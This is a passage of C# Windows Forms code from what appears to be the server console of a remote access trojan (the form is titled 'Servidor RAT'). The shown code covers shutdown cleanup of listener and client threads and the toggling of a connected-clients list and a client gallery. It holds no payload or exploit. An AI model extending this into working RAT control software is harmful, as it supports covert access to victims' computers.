                                        if (!hilo.Join(500)) // Solo 500ms
                                        {
                                           Console.WriteLine($"Hilo no respondió, forzando terminación...");
                                            try
                                            {
                                                hilo.Abort();
                    }
                    catch { }
                                        }
                                    }
                                }
                                catch (Exception ex)
                                {
                                   Console.WriteLine($"Error deteniendo hilo: {ex.Message}");
                                }
                            }
                            HilosClientes.Clear();
                        }
                    }
                    catch (Exception ex)
                    {
                       Console.WriteLine($"Error en cierre de hilos: {ex.Message}");
                    }
                });
                
                // Detener hilo principal de escucha con timeout
                if (Listening != null && Listening.IsAlive)
                {
                    try
                    {
                       Console.WriteLine("Deteniendo hilo principal de escucha...");
                        if (!Listening.Join(1000)) // 1 segundo máximo
                        {
                           Console.WriteLine("Hilo de escucha no respondió, forzando terminación...");
                            try
                        {
                            Listening.Abort();
                }
                catch { }
                        }
                        Listening = null;
            }
            catch (Exception ex)
            {
                       Console.WriteLine($"Error deteniendo hilo de escucha: {ex.Message}");
                    }
                }
                
               Console.WriteLine("Cierre seguro completado");
            }
            catch (Exception ex)
            {
               Console.WriteLine($"Error crítico al cerrar formulario: {ex.Message}");
            }
            finally
            {
                // Limpiar el NotifyIcon
                if (notifyIcon != null)
                {
                    try
                    {
                        notifyIcon.Visible = false;
                        notifyIcon.Dispose();
                    }
                    catch (Exception ex)
                    {
                       Console.WriteLine($"Error limpiando NotifyIcon: {ex.Message}");
                    }
                }
                
                base.OnFormClosing(e);
            }
        }

        protected override void OnHandleDestroyed(EventArgs e)
        {
            // Asegurar que se liberen los recursos cuando se destruye el handle
            try
            {
               Console.WriteLine("Handle destruido, liberando recursos...");
                isServerRunning = false;
                
                if (Servidor != null)
                {
                    try 
                    { 
                        Servidor.Stop(); 
                       Console.WriteLine("Servidor detenido en handle destroyed");
                    } 
                    catch (Exception ex)
                    {
                       Console.WriteLine($"Error deteniendo servidor en handle destroyed: {ex.Message}");
                    }
                    Servidor = null;
                }
                
                // Forzar terminación de hilos críticos
                if (Listening != null && Listening.IsAlive)
                {
                    try
                    {
                        Listening.Abort();
                       Console.WriteLine("Hilo de escucha terminado en handle destroyed");
                    }
                    catch (Exception ex)
                    {
                       Console.WriteLine($"Error terminando hilo de escucha: {ex.Message}");
                    }
                }
            }
            catch (Exception ex)
            {
               Console.WriteLine($"Error en OnHandleDestroyed: {ex.Message}");
            }
            
            base.OnHandleDestroyed(e);
        }

        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            try
            {
               Console.WriteLine("Formulario cerrado, limpieza final...");
                
                // Forzar detención de todos los hilos restantes
                if (Listening != null && Listening.IsAlive)
                {
                    try
                    {
                        Listening.Abort();
                       Console.WriteLine("Hilo de escucha terminado en form closed");
                    }
                    catch (Exception ex)
                    {
                       Console.WriteLine($"Error terminando hilo en form closed: {ex.Message}");
                    }
                }
                
                // Limpiar NotifyIcon si aún existe
                if (notifyIcon != null)
                {
                    try
                    {
                        notifyIcon.Visible = false;
                        notifyIcon.Dispose();
                       Console.WriteLine("NotifyIcon limpiado en form closed");
                    }
                    catch (Exception ex)
                    {
                       Console.WriteLine($"Error limpiando NotifyIcon: {ex.Message}");
                    }
                }
                
                // Forzar liberación de recursos
                try
                {
                    GC.Collect();
                    GC.WaitForPendingFinalizers();
                   Console.WriteLine("Garbage collection forzado en form closed");
                }
                catch (Exception ex)
                {
                   Console.WriteLine($"Error en garbage collection: {ex.Message}");
                }
            }
            catch (Exception ex)
            {
               Console.WriteLine($"Error en limpieza final: {ex.Message}");
            }
            finally
            {
                base.OnFormClosed(e);
            }
        }

        private void guna2ImageButton1_Click(object sender, EventArgs e)
        {
            // Reproducir sonido al hacer clic en el botón
            ReproducirSonidoConexion();
            
            ToggleClientesList();
        }

        private void ToggleClientesList()
        {
            // Verificar si la lista de clientes está visible
            if (listaClientesForm != null && this.Controls.Contains(listaClientesForm))
            {
                // Si está visible, ocultarla y volver a la vista normal
                HideClientesList();
            }
            else
            {
                // Si no está visible, mostrarla con ejemplos
                ShowClientesListWithExamples();
            }
        }

        private void HideClientesList()
        {
            try
            {
                // Remover el control de lista de clientes
                if (listaClientesForm != null)
                {
                    this.Controls.Remove(listaClientesForm);
                }
                
                // Restaurar el título del formulario
                this.Text = "Servidor RAT";
                
                // Aquí puedes agregar otros controles que quieras mostrar en la vista normal
                // Por ejemplo, si tienes otros controles en el Form1
            }
            catch (Exception ex)
            {
                                ShowNotification("Error de UI", 
                    $"Error al ocultar la lista de clientes: {ex.Message}", 
                    ToolTipIcon.Error);
            }
        }

        private void ShowClientesList()
        {
            try
            {
                // Crear el control de lista de clientes si no existe
                if (listaClientesForm == null || listaClientesForm.IsDisposed)
                {
                    listaClientesForm = new ListaClientesConectados();
                }
                
                // Configurar el control con un tamaño específico
                listaClientesForm.Dock = DockStyle.None;
                listaClientesForm.Location = new Point(100, 50); // Posición más arriba
                listaClientesForm.Size = new Size(1020, 300); // Ancho: 600px, Alto: 300px
                
                // Agregar el control al formulario principal
                this.Controls.Add(listaClientesForm);
                
                // Traer el botón al frente para que esté visible
                this.btnVista_ListaClientes.BringToFront();
                
                // Cambiar el título del formulario
                this.Text = "Servidor RAT - Lista de Clientes";
                
               Console.WriteLine("Lista de clientes mostrada correctamente");
            }
            catch (Exception ex)
            {
                                ShowNotification("Error de UI", 
                    $"Error al mostrar la lista de clientes: {ex.Message}", 
                    ToolTipIcon.Error);
            }
        }

        private void ShowClientesListWithExamples()
        {
            try
            {
                ShowClientesList();
                
                // Agregar algunos clientes de ejemplo (para pruebas)
                AgregarClientesEjemplo();
            }
            catch (Exception ex)
            {
                                ShowNotification("Error de UI", 
                    $"Error al mostrar la lista de clientes con ejemplos: {ex.Message}", 
                    ToolTipIcon.Error);
            }
        }

        private void AgregarClientesEjemplo()
        {
            // Agregar algunos clientes de ejemplo para mostrar el funcionamiento
            if (listaClientesForm != null)
            {
               
            }
        }

        private void btnVista_GaleriaClientes_Click(object sender, EventArgs e)
        {
            // Reproducir sonido al hacer clic en el botón
            ReproducirSonidoConexion();
            
            ToggleGaleriaClientes();
        }

        private void ToggleGaleriaClientes()
        {
            // Verificar si la galería de clientes está visible
            if (galeriaClientesForm != null && this.Controls.Contains(galeriaClientesForm))
            {
                // Si está visible, ocultarla y volver a la vista normal
                HideGaleriaClientes();
            }
            else
            {
                // Si no está visible, mostrarla
                ShowGaleriaClientes();
            }
        }

        private void HideGaleriaClientes()
        {
            try
            {
                // Ocultar la ventana de galería de clientes
                if (galeriaClientesForm != null && !galeriaClientesForm.IsDisposed)
                {
                    galeriaClientesForm.Hide();
                }
                
                Console.WriteLine("Galería de clientes ocultada");
            }
            catch (Exception ex)
            {
                ShowNotification("Error de UI", 
                    $"Error al ocultar la galería de clientes: {ex.Message}", 
                    ToolTipIcon.Error);
            }
        }

        public void ShowGaleriaClientes()
        {
            try
            {
                // Crear la ventana de galería de clientes si no existe
                if (galeriaClientesForm == null || galeriaClientesForm.IsDisposed)
                {
                    galeriaClientesForm = new GaleriaClientesFT();
                }
                
                // Mostrar la ventana
                galeriaClientesForm.Show();
                galeriaClientesForm.BringToFront();
                
                Console.WriteLine("Galería de clientes mostrada correctamente");
            }
            catch (Exception ex)
            {
                ShowNotification("Error de UI", 
                    $"Error al mostrar la galería de clientes: {ex.Message}", 
                    ToolTipIcon.Error);
            }
        }
    }
}
